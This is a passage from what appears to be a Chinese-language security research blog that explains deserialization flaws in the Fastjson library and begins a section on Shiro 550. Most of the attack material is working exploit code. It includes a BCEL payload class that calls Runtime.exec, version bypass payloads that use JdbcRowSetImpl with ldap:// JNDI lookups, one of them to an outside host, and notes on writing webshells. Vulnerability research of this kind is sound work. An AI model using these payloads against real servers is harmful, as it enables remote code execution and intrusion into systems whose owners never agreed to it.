java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="comment">//转字节码</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = convert(<span class="string">&quot;H:\\Java_Project\\Java_Security\\out\\production\\Java_Security\\com\\y5neko\\sec\\fastjson\\TemplatesImplPayload.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//BCEL加载</span></span><br><span class="line">        <span class="comment">//classLoader.loadClass(&quot;$$BCEL$$&quot; + code).newInstance();</span></span><br><span class="line"></span><br><span class="line">        System.out.println(code);</span><br><span class="line"></span><br><span class="line">        <span class="type">BasicDataSource</span> <span class="variable">basicDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BasicDataSource</span>();</span><br><span class="line">        basicDataSource.setDriverClassLoader(classLoader);</span><br><span class="line">        basicDataSource.setDriverClassName(<span class="string">&quot;$$BCEL$$&quot;</span> + code);</span><br><span class="line">        basicDataSource.getConnection();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] convert(String filePath) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filePath);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(<span class="string">&quot;文件不存在&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//读取文件为字节码</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="type">int</span> bytesRead;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((bytesRead = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                byteOutput.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> byteOutput.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把调用过程转换成fastjson payload</p>
<p><strong>FastjsonBcelPayload.java</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonBcelPayload</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>EXP</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp2.BasicDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="comment">//转字节码</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = convert(<span class="string">&quot;H:\\Java_Project\\Java_Security\\out\\production\\Java_Security\\com\\y5neko\\sec\\fastjson\\FastjsonBcelPayload.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//BCEL加载</span></span><br><span class="line">        <span class="comment">//classLoader.loadClass(&quot;$$BCEL$$&quot; + code).newInstance();</span></span><br><span class="line"></span><br><span class="line">        System.out.println(code);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        BasicDataSource basicDataSource = new BasicDataSource();</span></span><br><span class="line"><span class="comment">//        basicDataSource.setDriverClassLoader(classLoader);</span></span><br><span class="line"><span class="comment">//        basicDataSource.setDriverClassName(&quot;$$BCEL$$&quot; + code);</span></span><br><span class="line"><span class="comment">//        basicDataSource.getConnection();</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">string</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;driverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span> + code + <span class="string">&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        JSON.parseObject(string);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] convert(String filePath) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filePath);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(<span class="string">&quot;文件不存在&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//读取文件为字节码</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="type">int</span> bytesRead;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((bytesRead = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                byteOutput.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> byteOutput.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231024143414700.png" alt="image-20231024143414700" style="zoom:80%;" />

<h3 id="FastJson-2"><a href="#FastJson-2" class="headerlink" title="FastJson&lt;&#x3D;1.2.47绕过"></a>FastJson&lt;&#x3D;1.2.47绕过</h3><p>我们可以发现在1.2.25中，对<code>@type</code>进行了修复，检测了是否能够进行<code>AutoType</code>，而1.2.24在这里是直接进行<code>loadClass</code>，所以我们就要对这里进行一个绕过</p>
<blockquote>
<p>见FastJSON-&gt;分析-&gt;parseObject</p>
</blockquote>
<h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><p>我们跟进到parseObject方法</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231024151342329.png" alt="image-20231024151342329" style="zoom:80%;" />

<p>可以看到在这里引入了checkAutoType方法检测AutoType，检验流程</p>
<p><img src= "/img/friend_404.gif" data-lazy-src="/image/20230723230324-12283792-296a-1-1698131709133-3.png" alt="20230723230324-12283792-296a-1"></p>
<p>分析一下五种能加载类的方法</p>
<ul>
<li>在第一个中，因为在白名单中才能够进行缓存，所以这里不符合要求</li>
<li>在第二个返回类当中，期望类为空且类与期望类一致的时候返回类，这里我们的期望类为空，所以这里能够符合条件，所以我们在往上找，只要缓存中存在类，我们就能够进行加载。</li>
<li>第三个也是白名单限制</li>
<li>第四个是基于期望类的，因为这里和期望类并无关所以也满足不了</li>
<li>进入false来到第五个，又因为默认情况下AutoType为false，所以也加载不了</li>
</ul>
<p>也就是说我们只能通过第二个想办法</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231024154429926.png" alt="image-20231024154429926" style="zoom:80%;" />

<p>接下来详细分析一下如何在缓存中加载我们需要的类</p>
<p>我们跟进getClassFromMapping方法中，从里面找mapping里面的缓存</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231024155407127.png" alt="image-20231024155407127" style="zoom:80%;" />

<p>然后在loadClass中我们可以发现是有可能对类进行控制的，其他地方都是指定了一些基础类进行的缓存，而loadClass这里只要我们加载类成功以后，他就会放入缓存中，下次调用直接从缓存中进行加载，这里我们就要想怎么才能够在loadClass的时候将我们的类加载入缓存当中</p>
<p>继续查找loadClass用法</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231024161927983.png" alt="image-20231024161927983" style="zoom:80%;" />

<p>最后确定了MiscCodec里面的deserialize函数中，当clazz&#x3D;&#x3D;Class.class的时候会进行调用，然后我们来观察MiscCodec可以发现，他继承了反序列化和序列化的接口，在fastJson的反序列化中也会把他当作反序列化器来进行调用</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231024162030827.png" alt="image-20231024162030827" style="zoom:80%;" />

<p>如果FastJson反序列化的类是属于Class.class的时候，就会调用MiscCodec反序列化器，然后调用loadClass，传入我们想传入的字符串strVal，然后在loadClass中作为String className进行加载并放在缓存里面。</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231024205341228.png" alt="image-20231024205341228" style="zoom:80%;" />

<p>具体赋值在MiscCodec的deserialize方法</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231025094750576.png" alt="image-20231025094750576" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231025094834897.png" alt="image-20231025094834897" style="zoom:80%;" />

<p>我们可以看到这里的<code>parser</code>对应的就是后面的<code>lexer.stringVal</code>比较，必须满足是val才能够不抛出异常，所以我们就让string&#x3D;val就可以，然后后面我们对应反序列化的内容为恶意类就可以</p>
<h4 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonBypass_1247</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://ysmdiskerm.dgrh3.cn/ZGBWoLkn\&quot;,\&quot;AutoCommit\&quot;:\&quot;false\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231025095940823.png" alt="image-20231025095940823" style="zoom:80%;" />

<h3 id="FastJson1-2-25-1-2-41绕过"><a href="#FastJson1-2-25-1-2-41绕过" class="headerlink" title="FastJson1.2.25-1.2.41绕过"></a>FastJson1.2.25-1.2.41绕过</h3><p>在上个分析提到过，在缓存中获取类的下面有两个判断，也就是说在我们开启AutoType的情况下可以用下面两种方式来进行绕过：</p>
<ul>
<li>如果以<code>[</code>开头则去掉<code>[</code>后进行类加载（在之前Fastjson已经判断过是否为数组了，实际走不到这一步）</li>
<li>如果以<code>L</code>开头，以<code>;</code>结尾，则去掉开头和结尾进行类加载</li>
</ul>
<h4 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonBypassL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        String s=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/ZGBWoLkn\&quot;,\&quot;AutoCommit\&quot;:1&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="FastJson1-2-42绕过"><a href="#FastJson1-2-42绕过" class="headerlink" title="FastJson1.2.42绕过"></a>FastJson1.2.42绕过</h3><p>1.2.42相较于之前的版本，关键是在<code>ParserConfig.java</code>中修改了1.2.41前的代码</p>
<ul>
<li>对于传入的类名，删除开头<code>L</code>和结尾的<code>;</code></li>
</ul>
<p>但是可以发现在以上的处理中，只删除了一次开头的<code>L</code>和结尾的<code>;</code>，双写可以绕过。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;\<span class="string">&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/ZGBWoLkn\&quot;,\&quot;AutoCommit\&quot;:1&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="FastJson1-4-43绕过"><a href="#FastJson1-4-43绕过" class="headerlink" title="FastJson1.4.43绕过"></a>FastJson1.4.43绕过</h3><p>1.2.43版本修改了<code>checkAutoType()</code>的部分代码，对于LL等开头结尾的字符串抛出异常，这里我们就可以用<code>[</code>和<code>&#123;</code>进行绕过：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<span class="string">&quot;DataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:8085/hFtNevZa&quot;</span>,<span class="string">&quot;AutoCommit&quot;</span>:<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="FastJson原生反序列化"><a href="#FastJson原生反序列化" class="headerlink" title="FastJson原生反序列化"></a>FastJson原生反序列化</h3><p>依靠其他依赖的利用链，总归会受到环境的影响，因此我们可以尝试找出fastjson的原生反序列化链</p>
<h4 id="FastJson-3"><a href="#FastJson-3" class="headerlink" title="FastJson&lt;&#x3D;1.2.48"></a>FastJson&lt;&#x3D;1.2.48</h4><p>在FastJson包里面找到继承Serializable接口的类，最后锁定的是这两个类：<code>JSONObject</code>和<code>JSONArray</code>类</p>
<p><strong>JSONArray类利用链</strong></p>
<p>首先我们要找到入口点，就是readObject方法，但是我们却发现<code>JSONArray</code>中并不存在<code>readObject</code>方法，并且他<code>extends</code>对应的<code>JSON</code>类也没有readObect方法，所以这里我们只有通过其他类的readObject方法来触发JSONArray或者JSON的某个方法来实现调用链。</p>
<p>这里我们就要引入toString方法，我们可以发现在Json类中存在toString方法能够触发toJSONString方法的调用。然后我们再来探索一下</p>
<p>如果可以触发getter方法，就能够进行进一步的调用链</p>
<p><strong>Person.java</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;<span class="built_in">this</span>.name = name;<span class="built_in">this</span>.age = age;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;System.out.println(<span class="string">&quot;constructor被调用了&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;System.out.println(<span class="string">&quot;getName被调用了&quot;</span>);<span class="keyword">return</span> <span class="built_in">this</span>.name;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;System.out.println(<span class="string">&quot;setName被调用了&quot;</span>);<span class="built_in">this</span>.name = name;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;System.out.println(<span class="string">&quot;getAge被调用了&quot;</span>);<span class="keyword">return</span> <span class="built_in">this</span>.age;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123; System.out.println(<span class="string">&quot;setAge被调用了&quot;</span>);<span class="built_in">this</span>.age = age;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>NativeDemo.java</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NativeDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">JSON_Serialize</span> <span class="operator">=</span> JSON.toJSONString(person);</span><br><span class="line">        System.out.println(JSON_Serialize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231025110811498.png" alt="image-20231025110811498" style="zoom:80%;" />

<p>综上分析，我们找到一个能够readObject的类，调用toString方法，然后调用toJSONString方法，再调用getter，即可实现反序列化利用。</p>
<h3 id="fastjson面试总结-by-寒神"><a href="#fastjson面试总结-by-寒神" class="headerlink" title="fastjson面试总结 by 寒神"></a>fastjson面试总结 by 寒神</h3><p>fastjson 1.2.24<br>TemplatesImpl。 服务端开启特殊参数 Feature.SupportNonPublicFiel<br>Fastjson 的 json.parse()会调用类的getter和setter方法，而TemplatesImpl的getOutputProperties()会调用newTransformer()然后getTransletInstance()然后加载_bytecodes数组，并且newInstane。</p>
<p>JdbcRowSetImpl </p>
<p>JdbcRowSetImpl反序列化时，调用setter方法，触发setAutoCommit()，在this.conn为空时，调用this.connect()，这里面调用了javax.naming.InitialContext#lookup()，参数从dataSourceName成员变量获取</p>
<p>1.2.25 增加了checkAutoType，如果开了就 判断白名单，再判断黑名单，通过了就加载。但是可以通过描述符[ L ;来绕过</p>
<p>1.2.42 把明文黑名单转为了hash黑名单防止黑客进行分析，并且checkAutoType判断，如果L开头 ; 结尾就substring截断去除。但是由于是递归处理描述符的，双写LL;; 就绕过了</p>
<p>1.2.43 ban掉了L，用[ 绕</p>
<p>1.2.44 ban掉了 [</p>
<p>1.2.45 JndiDataSourceFactory的 由于payload中设置了properties属性值，JndiDataSourceFactory.setProperties()<br>InitCtx.lookup(properties.getProperty(“data_source”)); 从properties中获取了data_source</p>
<p>1.2.47 通过 java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。与1.2.24的区别就是将JdbcRowSetImpl加载到了Map中缓存</p>
<p> String payload  &#x3D; “{&quot;a&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},”<br>                + “&quot;b&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,”<br>                + “&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true}}”;<br>        JSON.parse(payload);</p>
<p>1.2.68 safeMode loadClass 重载方法默认的调用改为不缓存 通过AutoCloseable 任意文件写入 AutoCloseable是白名单</p>
<p>不出网利用<br>Commons-io 写文件&#x2F;webshell<br>但写webshell需要知道网站路径，不然就无法利用<br>如果为高权限，可尝试写定时任务，免密钥，等等（这些只是在理论情况下的猜想）<br>低版本限制&lt; fastjson 1.2.68</p>
<p>C3P0二次序列化 之 hex序列化字节加载器</p>
<p>BECL攻击，命令执行&#x2F;内存马<br>becl攻击则是利用tomcat的BasicDataSource链<br>编译poc，将poc的class字节码转化为bcel然后发送payload</p>
<h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><h2 id="Log4j"><a href="#Log4j" class="headerlink" title="Log4j"></a>Log4j</h2><h2 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h2><h3 id="shiro550"><a href="#shiro550" class="headerlink" title="shiro550"></a>shiro550</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>Shiro 550 反序列化漏洞存在版本：shiro &lt;1.2.4，产生原因是因为shiro接受了Cookie里面<code>rememberMe</code>的值，然后去进行Base64解密后，再使用aes密钥解密后的数据，进行反序列化。</p>
<p>反过来思考一下，如果我们构造该值为一个cc链序列化后的值进行该密钥aes加密后进行base64加密，那么这时候就会去进行反序列化我们的payload内容，这时候就可以达到一个命令执行的效果。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">登录成功并且点了rememberMe选项：</span><br><span class="line">writeObject序列化 -&gt; AES加密 -&gt; Base64编码 -&gt; 返回到Cookie内</span><br><span class="line"></span><br><span class="line">Cookie带着这段base64编码，代表ji&#x27;zhu</span><br><span class="line">获取rememberMe值 -&gt; Base64解密 -&gt; AES解密 -&gt; 调用readobject反序列化操作</span><br></pre></td></tr></table></figure>

<h4 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h4><p><strong>漏洞环境</strong>：这里我是直接用的vulhub的shiro550demo</p>
<h5 id="普通登录"><a href="#普通登录" class="headerlink" title="普通登录"></a>普通登录</h5><p>我们直接下断点在登陆判定</p>
<p><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231121232506327.png" alt="image-20231121232506327"></p>
<p>然后回到web正常登录试试</p>
<p><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231121232835725.png" alt="image-20231121232835725"></p>
